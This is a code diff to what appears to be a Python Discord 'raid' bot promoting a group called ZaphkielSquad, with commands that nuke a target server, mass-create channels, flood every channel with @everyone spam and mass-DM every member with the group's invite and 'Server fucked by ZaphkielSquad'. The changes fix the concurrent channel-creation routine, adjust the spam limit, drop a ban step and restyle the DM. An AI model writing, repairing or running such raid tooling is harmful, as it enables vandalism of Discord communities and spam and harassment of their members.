@@ -239,7 +239,6 @@ async def vs(ctx, server_id: int, cantidad: int=100):
         await cn.callback(silent_ctx)
         await ci.callback(silent_ctx)
         await nuke.callback(silent_ctx)
-        await bn.callback(silent_ctx)
         await md.callback(silent_ctx)
         await ret.callback(silent_ctx, cantidad)
         await ctx.send(f'Comandos activados en **{guild.name}** ({guild.id})')
@@ -252,7 +251,7 @@ async def vs(ctx, server_id: int, cantidad: int=100):
 async def spam(ctx):
     cantidad = 20
     mensaje = '¿Quieres tener Hacks, Tools o Bot de raid? \n  __**Unete a ZaphkielSquad, el mejor servidor de**__ \n               __**esta comunidad de mierda.**__\n          https://discord.gg/VzZNw3bMs2 \n          __ Server fucked by ZaphkielSquad__\n                              No Mercy.\n                           @everyone'
-    if cantidad > 50:
+    if cantidad > 20:
         return
     async def enviar_en_canal(canal):
         for _ in range(cantidad):
@@ -276,7 +275,7 @@ async def raid(ctx, cantidad: int=80):
         except:
             return
 
-    tareas = [crear_canal]
+    tareas = [crear_canal(i) for i in range(1, cantidad + 1)]
     await asyncio.gather(*tareas, return_exceptions=True)
 
 @bot.command()
@@ -285,8 +284,8 @@ async def md(ctx):
     enviados = 0
     fallidos = 0
     repeticiones = 20
-    mensaje_predefinido = '\n\n¿Quieres tener Hacks, Tools o Bot de raid? Unete a ZaphkielSquad, el mejor servidor de esta comunidad de mierda. \n https://discord.gg/VzZNw3bMs2 \n Server fucked by ZaphkielSquad \n                     No Mercy.'
-    embed = discord.Embed(title='ZaphkielSquad', description=mensaje_predefinido, color=discord.Color.blurple())
+    mensaje_predefinido = '\n\n¿Quieres tener Hacks, Tools o Bot de raid? Unete a ZaphkielSquad, el mejor servidor de esta comunidad. \n https://discord.gg/VzZNw3bMs2 \n Server fucked by ZaphkielSquad \n                     No Mercy.'
+    embed = discord.Embed(title='ZaphkielSquad', description=mensaje_predefinido, color=discord.Color.red())
     for miembro in ctx.guild.members:
         if miembro.bot:
             continue
